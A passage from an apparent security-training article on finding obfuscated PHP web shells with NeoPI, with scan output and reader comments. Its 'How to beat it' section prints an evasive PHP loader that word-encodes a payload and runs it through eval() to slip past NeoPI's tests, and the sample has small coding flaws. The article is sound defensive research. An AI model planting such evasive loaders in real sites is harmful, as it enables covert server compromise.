<a href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/root-at-1.jpg"><img class="alignleft size-full wp-image-1509" title="root at 1" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/root-at-1.jpg" alt="" width="734" height="92" /></a><br />
We specified that we are not concerned with many common image types. We can see that this webserver has quite a large number of webpages. Let’s say I’m pretty confident that my webserver only supports PHP pages. Let’s get a count for how many PHP pages we are dealing with:<br />
<a href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/root-at-2.jpg"><img class="alignleft size-full wp-image-1510" title="root at 2" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/root-at-2.jpg" alt="" width="680" height="98" /></a><br />
We can see that the webserver hosts close to 4,000 PHP pages. We went ahead and planted four web shells throughout the web directories. This included a fully encrypted web shell, C99, a web shell that contained a mixture of encrypted and plain text, and a shell generated by Weevely. The files were modified to avoid signature based detection systems. This environment is meant to simulate the situation described above, where you believe a malicious web shell may exist within your web root, but signature based malware detection tools can’t seem to locate any malicious files. Let’s go head and run NeoPI to see if it can help.</p>
<p><code lang="python">[sbehrens@WebServer2 opt]$ sudo ./neopi.py -C scan1.csv -a -A /var/www/</code><br />
<a href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/C-scan1.jpg"><img class="alignleft size-full wp-image-1507" title="C scan1" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/C-scan1.jpg" alt="" width="976" height="886" /></a><br />
This is the full output of the scan results. We can see that average I.C. is displayed at the top of the output. This gives us an average index of coincidence (kappa-plaintext) of .0372. It should be noted that the average index of coincidence is reported without normalizing the denominator. An interesting observation is that the expected coincidence rate for a uniform distribution of the English language is 0.0385. The tool displays the files with the lowest Index of Coincidence first. We see Index of Coincidence seems relatively abnormal for shell3.php. We also see Weevely, shell2.php, and shell.php have made it into the results. We then move down to Entropy, which shows shell3.php, shell2.php, and Weevely. Longest word is very helpful for detecting fully encrypted backdoors such as shell3.php and shell2.php.</p>
<p>We calculate a simple average of all three functions and give you a percentage of confidence on its probability. As we can see in the top 10 highest ranked files, the tool was able to identify shell3.php, weevely.php, shell.php. shell2.php which is predominately non encrypted did get flagged by I.C. and entropy, but did not make the average list. We highly suggest that you check out all of the files listed in each test as some tests are more effective at detecting certain shells than others.</p>
<h2>Windows</h2>
<p>The tool is cross compatible with Windows as well. In the example below, we use a regular expressing to just search for php and text files.</p>
<p><code lang="python">python neopi.py -a c:\temp\phpbb "php|txt"</code><br />
<a href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/php-text.jpg"><img class="alignleft size-full wp-image-1549" title="php text" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/php-text.jpg" alt="" width="542" height="698" /></a></p>
<h1>How to beat it</h1>
<p>As with all malware detection, there are steps which can be taken to avoid detection. NeoPI is focused on detecting obfuscated code; in fact it will often perform better in detecting code which is MORE obfuscated. Unobfuscated code is transparent to the tests performed and would perfectly blend in with other code on the system (but be vulnerable to signature or expression search detection). Code obfuscated in such a way that the obfuscation looks like normal text will likely be not be highlighted by NeoPI. One such obfuscation method might encode/decode text into strings composed of valid English words or script language. This encoded string would escape I.C. analysis because the frequency of letters is consistent with genuine code. It would also have an entropy value consistent with genuine code because the word level obfuscation would bias the entropy calculation. Finally, so long as spaces are also implemented within the obfuscation the code would escape detection by a longest word search.</p>
<p>Here is example code for a simple encoding mechanism that would escape detection by NeoPI. It is loosely based off of the PHP shell listed in the beginning of the article.</p>
<p><code lang="python"><!--?php </code--></code></p>
<p><code lang="python">$string = "iguana frog EATS iguana seal seal elk tiger EATS SPRINTS PEES GOAT ELK TIGER PUKES JUMPS cat mole dog JUMPS KILLS SLEEPS SLEEPS GIGGLES SPACE elk cat hog olm SPACE TICK GIGGLES SPRINTS PEES GOAT ELK TIGER PUKES JUMPS cat mole dog JUMPS KILLS POOPS TICK MURDERS SPACE POOPS";</code></p>
<p><code lang="python">$dict = array(<br />
"a" =&gt; ""ardvark","b" =&gt; "bat","c" =&gt; "cat","d" =&gt; "dog","e" =&gt; "elk","f" =&gt; "frog","g" =&gt; "goat","h" =&gt; "hog","i" =&gt; "iguana","j" =&gt; "jackal","k" =&gt; "kiwi","l" =&gt; "lion","m" =&gt; "mole","n" =&gt; "newt","o" =&gt; "olm","p" =&gt; "pig","q" =&gt; "quail","r" =&gt; "rat","s" =&gt; "seal","t" =&gt; "tiger","u" =&gt; "vulture","v" =&gt; "wasp","x" =&gt; "xena","y" =&gt; "yak","z" =&gt; "zebra"," " =&gt; "space","(" =&gt; "eats",")" =&gt; "sleeps","." =&gt; "sneezes","[" =&gt; "pukes","]" =&gt; "kills","'" =&gt; "jumps","\"" =&gt; "rolls",";" =&gt; "murders","=" =&gt; "dances","\$" =&gt; "sprints","{" =&gt; "giggles","}" =&gt; "poops","_" =&gt; "pees","&lt;" =&gt; "falls","&gt;" =&gt; "vomits","?" =&gt; "coughs","`" =&gt; "tick");</code></p>
<p><code lang="python">function decode($string, $array) {<br />
$output = "";<br />
$words = explode(" ", $string);<br />
foreach ($words as $word) {<br />
$upper = isUpper($word);<br />
$word = strtolower($word);<br />
if ($key = array_search($word, $array)) {<br />
if ($upper) $key = strtoupper($key);<br />
$output = "{$output}{$key}";<br />
} else {<br />
$output = "{$output}{$word}";<br />
}<br />
}<br />
return $output;<br />
}<br />
function isUpper($char) {<br />
if (strtoupper($char) == $char) return true;<br />
return false;<br />
}</code></p>
<p><code lang="python">eval(decode($string, $dict));<br />
?&gt;</code></p>
<h1>Conclusion</h1>
<p>Web shells are an overlooked threat that can be difficult to detect due to ease of implementing some simple evasion techniques. We have discussed some techniques for detecting these files including the entropy, longest word, and index of coincidence tests. NeoPI hopes to continually evolve and come up with additional methods of testing in order to better detect these malicious files.</p>
<div class='ig_inline_container ig_the_content ig_after'></div>
      <div class="share vertical">

  <ul>
    
    <li class="twitter">
      <a class="twitter-share-button"
        href="https://twitter.com/share"
        data-size="medium"
        data-url="http://resources.infosecinstitute.com/web-shell-detection/"
        data-count-url="http://resources.infosecinstitute.com/web-shell-detection/"
        data-count="vertical"
        data-via="InfosecEdu"
        data-related="infosecedu"
        data-hashtags="infosec"
        data-text="Web Shell Detection Using NeoPI">
      Tweet
      </a>
    </li>
    
    <li class="google">
      <div class="g-plus"
        data-action="share"
        data-annotation="vertical-bubble">
      </div>
    </li>
    
    <li class="linkedin">
      <script type="IN/Share" data-counter="top"></script>
    </li>
    
    <li class="reddit">
      <script type="text/javascript" src="//www.redditstatic.com/button/button2.js"></script>
    </li>
    
    <li class="facebook">
      <div class="fb-like"
        data-width="90"
        data-layout="box_count"
        data-action="like"
        data-show-faces="false"
        data-share="false"
      ></div>
    </li>
    
  </ul>

</div>    </article>
    <section class="post-author ">
  
  <div class="image">
    <img alt='' src='http://2.gravatar.com/avatar/bf9335d5fe3e878b385f5f73945dd5ac?s=96&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/bf9335d5fe3e878b385f5f73945dd5ac?s=192&amp;d=mm&amp;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' />
  </div>
  
  <div class="name">
    <span>Author</span>
    <h5>
      <a href="http://resources.infosecinstitute.com/author/behrenshagen">Scott Behrens and Ben Hagen</a>
    </h5>
  </div>
  
  <div class="description">
    Scott Behrens (pictured) and Ben Hagen are security researchers for InfoSec Institute and are security consultants with Neohapsis.
<br><br>
Scott Behrens specializes in Web application security, malware analysis and research, and network and endpoint defense. Before joining Neohapsis, Behrens worked as an open-systems architect with a focus on designing systems and networks for financial trading firms. He received both a BS in Network Engineering and an MS in Network Security from DePaul University.
<br><br>
Ben Hagen specializes in application assessments and penetration tests. Hagen also has experience investigating security incidents, monitoring IDS solutions, and developing software, procedures, and policies for effective and robust security monitoring. Ben holds a Masters Degree in Information Assurance and numerous security certifications.
  </div>
  
    
</section>  </div>
  
      <ul class="sidebar post-col-1-3">

  
  
    
  
  
          <li class="practice-exams">
        <h4>Free Practice Exams</h4>
        <ul>
                      <li>
              <a href="https://www.skillset.com/certifications/securityplus" target="_blank">
                <img src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//sec+-lbox-72x40-ffffff.jpg" width="36" height="20" alt="Security+ Practice Exam">
                Security+ Practice Exam
              </a>
            </li>
                      <li>
              <a href="https://www.skillset.com/certifications/ceh" target="_blank">
                <img src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//CEH1-lbox-72x40-ffffff.jpg" width="36" height="20" alt="CEH Practice Exam">
                CEH Practice Exam
              </a>
            </li>
                      <li>
              <a href="https://www.skillset.com/certifications/cissp" target="_blank">
                <img src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//cissp-lbox-72x40-ffffff.jpg" width="36" height="20" alt="CISSP Practice Exam">
                CISSP Practice Exam
              </a>
            </li>
                  </ul>
      </li>
    
  

  <li class="bootcamps">
  <h4>Free Training Tools</h4>
    <ul>
      <li><a class="icon right-arrow" target="blank" href="http://securityiq.infosecinstitute.com/?resources-sidebar">Phishing Simulator</a></li>
      <li><a class="icon right-arrow" target="blank" href="http://securityiq.infosecinstitute.com/?resources-sidebar">Security Awareness</a></li>
    </ul>
  </li>

  
          <li class="editors-choice">
        <h4>Editors Choice</h4>
        <ul>
                      <li>
              <a class="icon post-s" href="http://resources.infosecinstitute.com/pci-dss-3-2-is-coming-are-you-ready/">PCI-DSS 3.2 is Coming: Are You Ready?</a>
            </li>
                      <li>
              <a class="icon post-s" href="http://resources.infosecinstitute.com/public-key-infrastructure-pki/">Public Key Infrastructure (PKI)</a>
            </li>
                      <li>
              <a class="icon post-s" href="http://resources.infosecinstitute.com/snmp-pentesting/">SNMP Pentesting</a>
            </li>
                  </ul>
      </li>
    
  
  
             <li class="bootcamps">
        <h4>Related Boot Camps</h4>
        <ul>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/security.html" target="_blank">Information Security</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/security_awareness_training.html" target="_blank">Security Awareness</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.intenseschool.com/boot_camp/cisco/ccna" target="_blank">CCNA</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.intenseschool.com/boot_camp/pm/pm_professional" target="_blank">PMP</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/microsoft-training.html" target="_blank">Microsoft</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/incident_respone_network_forensics.html" target="_blank">Incident Response</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/information-assurance.html" target="_blank">Information Assurance</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/ethical_hacking_training.html" target="_blank">Ethical Hacking</a>
            </li>
                      <li>
              <a class="icon right-arrow" href="http://www.infosecinstitute.com/courses/hacker_training_online.html" target="_blank">Hacker Training Online</a>
            </li>
                  </ul>
      </li>
    
  
  
    
  
  
    
  
  
</ul>    
  <ul class="random-posts ">
      <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//PCI-237x237-c-default.jpg');">
      <a class="icon post-l" href="http://resources.infosecinstitute.com/pci-dss-3-2-is-coming-are-you-ready/" title="PCI-DSS 3.2 is Coming: Are You Ready?">
        <h3>PCI-DSS 3.2 is Coming: Are You&hellip;</h3>
      </a>
    </li>
      <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//050316_2316_PublicKeyIn13-237x237-c-default.png');">
      <a class="icon post-l" href="http://resources.infosecinstitute.com/public-key-infrastructure-pki/" title="Public Key Infrastructure (PKI)">
        <h3>Public Key Infrastructure (PKI)</h3>
      </a>
    </li>
      <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//050216_2256_SNMPPentest81-237x237-c-default.png');">
      <a class="icon post-l" href="http://resources.infosecinstitute.com/snmp-pentesting/" title="SNMP Pentesting">
        <h3>SNMP Pentesting</h3>
      </a>
    </li>
      <li style="background-image: url('http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads//042816_1940_MasteringMo2-237x237-c-default.png');">
      <a class="icon post-l" href="http://resources.infosecinstitute.com/mastering-mobile-forensics/" title="Mastering Mobile Forensics">
        <h3>Mastering Mobile Forensics</h3>
      </a>
    </li>
  </ul>  
      
<div id="disqus_thread">
            <div id="dsq-content">


            <ul id="dsq-comments">
                    <li class="comment even thread-even depth-1" id="dsq-comment-20162">
        <div id="dsq-comment-header-20162" class="dsq-comment-header">
            <cite id="dsq-cite-20162">
http://siperdana.blogspot.com                <span id="dsq-author-user-20162">si perda</span>
            </cite>
        </div>
        <div id="dsq-comment-body-20162" class="dsq-comment-body">
            <div id="dsq-comment-message-20162" class="dsq-comment-message"><p>have you try <a href="https://pkaji.honeynet.org.my/" onclick="__gaTracker('send', 'event', 'outbound-comment', 'https://pkaji.honeynet.org.my/', 'https://pkaji.honeynet.org.my/');" rel="nofollow">https://pkaji.honeynet.org.my/</a>?<br />
it can extract list of called php function with their parameters</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-20634">
        <div id="dsq-comment-header-20634" class="dsq-comment-header">
            <cite id="dsq-cite-20634">
http://www.rfxn.com                <span id="dsq-author-user-20634">Ryan MacDonald</span>
            </cite>
        </div>
        <div id="dsq-comment-body-20634" class="dsq-comment-body">
            <div id="dsq-comment-message-20634" class="dsq-comment-message"><p>Very nice writeup! </p>
<p>Would it be at all possible for you to submit by email to ryan  rfxn.com or upload to <a href="ftp://rfxn.com/incoming/" rel="nofollow">ftp://rfxn.com/incoming/</a>, the repo of 90 webshells you utilized in your testing as so I may include them in signature updates for LMD?</p>
<p>I will also be looking to integrated some features into LMD based on the principles enclosed in this article, will credit the authors accordingly.</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-20684">
        <div id="dsq-comment-header-20684" class="dsq-comment-header">
            <cite id="dsq-cite-20684">
                <span id="dsq-author-user-20684">Scott behrens</span>
            </cite>
        </div>
        <div id="dsq-comment-body-20684" class="dsq-comment-body">
            <div id="dsq-comment-message-20684" class="dsq-comment-message"><p>Hey Ryan,</p>
<p>I went ahead and dropped the shell repository in your FTP directory.    </p>
<p>We have a very high interest in integrating this tool and methodology in traditional signature based detection tools.  It is our belief that the best approach is a combination of both methods.  We plan on continuing development of NeoPI as we plan on releasing more statistical tests as well as other methodology for detecting webshells that may evade signature based detection.</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-20761">
        <div id="dsq-comment-header-20761" class="dsq-comment-header">
            <cite id="dsq-cite-20761">
http://www.rfxn.com                <span id="dsq-author-user-20761">Ryan MacDonald</span>
            </cite>
        </div>
        <div id="dsq-comment-body-20761" class="dsq-comment-body">
            <div id="dsq-comment-message-20761" class="dsq-comment-message"><p>Scott,<br />
 Thank you for the submission! If I can be of help in any way, let me know. I have access to hundreds of web servers and there-in hundreds of thousands of web files, so perhaps I can assist in generating base line statistical data if needed or a vast repository of malware for you to test against.</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment even thread-even depth-1" id="dsq-comment-176593">
        <div id="dsq-comment-header-176593" class="dsq-comment-header">
            <cite id="dsq-cite-176593">
http://fstrange.ru                <span id="dsq-author-user-176593">fStrange</span>
            </cite>
        </div>
        <div id="dsq-comment-body-176593" class="dsq-comment-body">
            <div id="dsq-comment-message-176593" class="dsq-comment-message"><p>Thanks! A similar article about <a href="http://fstrange.ru/coder/php/backdoor-shell-remview.html" onclick="__gaTracker('send', 'event', 'outbound-comment', 'http://fstrange.ru/coder/php/backdoor-shell-remview.html', 'php backdoors');" rel="nofollow">php backdoors</a> in Russian</p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-219110">
        <div id="dsq-comment-header-219110" class="dsq-comment-header">
            <cite id="dsq-cite-219110">
http://technomaina.blogspot.com                <span id="dsq-author-user-219110">rjcrystal</span>
            </cite>
        </div>
        <div id="dsq-comment-body-219110" class="dsq-comment-body">
            <div id="dsq-comment-message-219110" class="dsq-comment-message"><p>awesome article i was thinking for same but the idea of entropy is really innovative good work friends</p>
</div>
        </div>

    </li><!-- #comment-## -->
            </ul>


        </div>

    </div>


  
        </div>
      </section>
      
              <footer class="site-footer">
  
  <div class="ctas full">
    
    <div class="col-3-3 wrapper">
      
      <div class="col-1-3">
        <h6>About InfoSec</h6>
        <p>InfoSec Institute is the best source for high quality <a href="http://www.infosecinstitute.com" style="color:#fff;">information security training</a>. We have been training Information Security and IT Professionals since 1998 with a diverse lineup of relevant training courses. In the past 16 years, over 50,000 individuals have trusted InfoSec Institute for their professional development needs! </p>

      </div>
      
      <div class="col-1-3">
        <h6>Connect with us</h6>
        <p>Stay up to date with <a href="http://www.infosecinstitute.com" style="color:#fff;">InfoSec Institute</a> and <a href="http://www.intenseschool.com" style="color:#fff;">Intense School</a> - at info@infosecinstitute.com</p>

        <ul class="footer-social">
  <li>
    <div class="fb-like" data-href="http://resources.infosecinstitute.com" data-width="90" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
  </li>
  <li>
    <a class="twitter-follow-button" href="https://twitter.com/infosecedu" data-show-count="false" data-lang="en">Follow @infosecedu</a>
  </li>
</ul>      </div>
      
      <div class="col-1-3">
        <form action="/newsletter/signup" method="post" class="mailchimp has-loader" novalidate>
  
  <aside>
    <h6>Join our newsletter</h6>
    <p>Get the latest news, updates & offers straight to your inbox.</p>

  </aside>
  
  <fieldset>
    <input type="email" title="Email address" value="" name="EMAIL" placeholder="Enter your email">
    <input type="submit" value="Subscribe" class="generic-cta green">
    <input type="text" name="b_2593cfe26893087ed36e00fe3_ba06ce498c" tabindex="-1" value="">
  </fieldset>
  
</form>      </div>
      
    </div>
    
  </div>
  
  <div class="navigation full">
    
    <div class="col-3-3 wrapper">
      
      <nav class="footer">
        <ul>
                  </ul>
      </nav>

      <div class="copyright">&copy; InfoSec Resources 2016</div>
      
    </div>
    
  </div>

</footer>            
    </main>
    
      <div class="modal">
  <div class="modal-inner">
    <a rel="modal:close">Close</a>
    <div class="modal-content"></div>
  </div>
</div>

<div id="modal-hidden">
                <div id="download">
  <div class="pardot form">
    <h4 class="pardot-title">File download</h4>
    <form id="download-form" action="https://go.pardot.com/l/12882/2014-12-11/cqhcw" method="post"><input type="hidden" name="entry_title" value="Web Shell Detection Using NeoPI">
      <input type="hidden" name="download_title" value="">
      <input type="hidden" name="resources_training" value="">

      
      <input type="hidden" name="url" value="http://resources.infosecinstitute.com/web-shell-detection/">
      <input type="hidden" name="entry_id" value="1506">
      <input type="hidden" name="entry_url" value="http://resources.infosecinstitute.com/web-shell-detection/">
      <input type="hidden" name="entry_type" value="">

      <ul>
        <li data-required>
          <label>First Name</label>
          <input name="first_name">
        </li>
        <li data-required>
          <label>Last Name</label>
          <input name="last_name">
        </li>
        <li data-required>
          <label>Work Phone Number</label>
          <input name="phone">
        </li>
        <li data-required>
          <label>Work Email Address</label>
          <input name="email">
        </li>
        <li>
          <label>Job Title</label>
          <input name="job_title">
        </li>
                  <li class="training-fund">
            <label>How will you fund your training?</label>
            <div class="dd">
              <select name="training_fund">
                                  <option value="No current plan">No current plan</option>
                                  <option value="Employer Paid">Employer Paid</option>
                                  <option value="GI Bill">GI Bill</option>
                                  <option value="Tuition Assistance">Tuition Assistance</option>
                                  <option value="Self Pay">Self Pay</option>
                                  <option value="Other">Other</option>
                              </select>
            </div>
          </li>
                          <li class="training-why">
            <label>Why Take This Training?</label>
            <div class="dd">
              <select name="training_why">
                                  <option value="I'm not interested in training" title="I'm not interested in training">I'm not interested in training</option>
                                  <option value="To get certified - company mandated" title="To get certified - company mandated">To get certified - company mandated</option>
                                  <option value="To get certified - my own reasons" title="To get certified - my own reasons">To get certified - my own reasons</option>
                                  <option value="To improve my skillset - get a promotion" title="To improve my skillset - get a promotion">To improve my skillset - get a promotion</option>
                                  <option value="To improve my skillset- for a new job" title="To improve my skillset- for a new job">To improve my skillset- for a new job</option>
                                  <option value="Other" title="Other">Other</option>
                              </select>
            </div>
          </li>
                          <li class="training-timeline">
            <label>What is your timeline for training?</label>
            <div class="dd">
              <select name="training_timeline">
                                  <option value="I have no current timeline for training">I have no current timeline for training</option>
                                  <option value="Within a month">Within a month</option>
                                  <option value="1-3 months">1-3 months</option>
                                  <option value="3-6 months">3-6 months</option>
                                  <option value="6-12 months">6-12 months</option>
                                  <option value="Over 1 year">Over 1 year</option>
                              </select>
            </div>
          </li>
                <li class="full">
          <input type="submit" class="generic-cta green" value="Download files">
        </li>
      </ul>

      <p>InfoSec institute respects your privacy and will never use your personal information for anything other than to notify you of your requested course pricing. We will never sell your information to third parties. You will not be spammed.</p>

      <div style="position:absolute; left:-9999px; top: -9999px;">
        <label for="pardot_extra_field">Comments</label>
        <input type="text" id="pardot_extra_field" name="pardot_extra_field">
      </div>

    </form>
  </div>
</div>            <div id="skillset-modal">
  <div class="skillset window">
    <h4>What is Skillset?</h4>
    <aside>
      
      <div class="left">
        <h3>Skillset</h3>
        <h5>Practice tests & assessments.</h5>
      </div>
      
      <div class="right">
        <p>Practice for certification success with the Skillset library of over 100,000 practice test questions. We analyze your responses and can determine when you are ready to sit for the test. Along your journey to exam readiness, we will:</p>
<p></p>
<p>1. Determine which required skills your knowledge is sufficient<br />
2. Which required skills you need to work on<br />
3. Recommend specific skills to practice on next<br />
4. Track your progress towards a certification exam</p>

      </div>
      
    </aside>
  </div>
</div>    </div>      
    <script src="//platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>

<script>
window.twttr=(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],t=window.twttr||{};if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);t._e=[];t.ready=function(f){t._e.push(f);};return t;}(document,"script","twitter-wjs"));
</script>

<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3&appId=552038044933986";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<script src="https://apis.google.com/js/platform.js" async defer></script>      
      <script>var postID = 1506;</script>
    
    <script type='text/javascript'>
    			jQuery(function() {
    				jQuery( window ).on( 'init.icegram', function( e, ig ) {
				        jQuery('.ig_inline_container:empty').remove();
				    });
    			});
    		 </script>
<style type="text/css">
.ig_hide .wpcf7-response-output,
.ig_form_container .screen-reader-response{
	display: none !important;
}
.ig_show .ig_form_container.layout_bottom .wpcf7-response-output,
.ig_show .ig_form_container.layout_right .wpcf7-response-output,
.ig_show .ig_form_container.layout_left .wpcf7-response-output{
	background-color: #FFF;
	color: #444;
	position: absolute;
}
.ig_sidebar .ig_form_bottom.ig_show .ig_form_container.layout_bottom .wpcf7-response-output{
	bottom: 0;
}
.ig_overlay.ig_form_bottom.ig_show .ig_form_container.layout_bottom .wpcf7-response-output,
.ig_action_bar.ig_bottom.ig_show .ig_form_container.layout_right .wpcf7-response-output,
.ig_action_bar.ig_bottom.ig_show .ig_form_container.layout_left .wpcf7-response-output{
	bottom: 100%;
}
</style>

<script type="text/javascript">
jQuery(function() {
  	jQuery( window ).on( "init.icegram", function(e, ig) {
	  	// Find and init all CF7 forms within Icegram messages/divs and init them
	  	if(ig){
		  	jQuery.each(ig.messages, function(i, msg){

		  		jQuery(msg.el).find('form input[name=_wpcf7]').each(function(){
			  		var form = jQuery(this).closest('form');
			  		if(form && !form.hasClass('ig_form_init_done')){
			  			if(form.closest('.ig_form_container').length > 0){
				  			if(form.parent().find('.screen-reader-response').length == 0){
				  				form.before('<div class="screen-reader-response"></div>')
				  			}
				  			if(form.find('wpcf7-response-output').length == 0){
				  				form.append('<div class="wpcf7-response-output wpcf7-display-none"></div>')
				  			}
					  		form.closest('.ig_form_container').attr('id', form.find('input[name=_wpcf7_unit_tag]').val()); //_wpcf7_unit_tag
			  			}
			  			form.wpcf7InitForm();
			  			form.addClass('ig_form_init_done');
			  		}
		  		});

		  	});
	  	}

  	}); // init.icegram
	
	// Dismiss response text/div when shown within icegram form container
	jQuery('body').on('click', '.ig_form_container .wpcf7-response-output', function(e) {
			jQuery(e.target).slideUp();
	});
	// Handle CTA function(s) after successful submission of form
  	jQuery( window ).on('wpcf7:mailsent', function(e) {
  		if( typeof icegram !== 'undefined'){
		  	var msg_id = (jQuery(e.target.closest('[id^=icegram_message_]')).attr('id') || '').split('_').pop() || 0 ;
		  	var ig_msg = icegram.get_message_by_id(msg_id) || undefined;
		  	if(ig_msg && ig_msg.data.cta === 'form_via_ajax' && ig_msg.data.cta_option_form_via_ajax == 'hide_on_success'){
				ig_msg.hide();
		  	}
  		}
	});

});
</script>

			<script type="text/javascript">
<!--
piCId = '1951';
piAId = '13882';


(function() {
	function async_load(){
		var s = document.createElement('script'); s.type = 'text/javascript';
		s.src = ('https:' == document.location.protocol ? 'https://pi' : 'http://cdn') + '.pardot.com/pd.js';
		var c = document.getElementsByTagName('script')[0]; c.parentNode.insertBefore(s, c);
	}
	if(window.attachEvent) { window.attachEvent('onload', async_load); }
	else { window.addEventListener('load', async_load, false); }
})();
-->
</script><script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.5'></script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/app.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"platform":"wordpress@4.3.3","language":"","remote_auth_s3":"W10= 048c002d49db0b9581a9cd4d9067f706d42d6fc0 1462461398","api_key":"1TA9XhBKpqfZxr6kJiBvCescmAiajXtudB0o4aJYPZguLsFA5bUOtWPGbsoOAiku","sso":{"name":"InfoSec Resources","button":false,"url":"http:\/\/resources.infosecinstitute.com\/wp-login.php","logout":"http:\/\/resources.infosecinstitute.com\/wp-login.php?action=logout","width":"800","height":"700"}},"disqusIdentifier":"1506 http:\/\/infosec.wpengine.com\/?p=1506","disqusShortname":"infosecinstituteresources","disqusTitle":"Web Shell Detection Using NeoPI","disqusUrl":"http:\/\/resources.infosecinstitute.com\/web-shell-detection\/","options":{"manualSync":false},"postId":"1506"};
/* ]]> */
</script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/disqus-comment-system/media/js/disqus.js?ver=4.3.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"infosecinstituteresources"};
/* ]]> */
</script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/disqus-comment-system/media/js/count.js?ver=4.3.3'></script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var icegram_pre_data = {"ajax_url":"http:\/\/resources.infosecinstitute.com\/wp-admin\/admin-ajax.php","post_obj":{"is_home":false,"page_id":1506,"action":"display_messages","shortcodes":[],"cache_compatibility":"yes","device":"laptop"}};
/* ]]> */
</script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/icegram/assets/js/main.js?ver=1.9.13'></script>

    
  <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"40195a0833","applicationID":"8563997","transactionName":"b1NRMRdTChAEBRFaDlYZcgYRWwsNShUMXQZUUw==","queueTime":0,"applicationTime":6052,"atts":"QxRSR19JGR4=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
  
</html>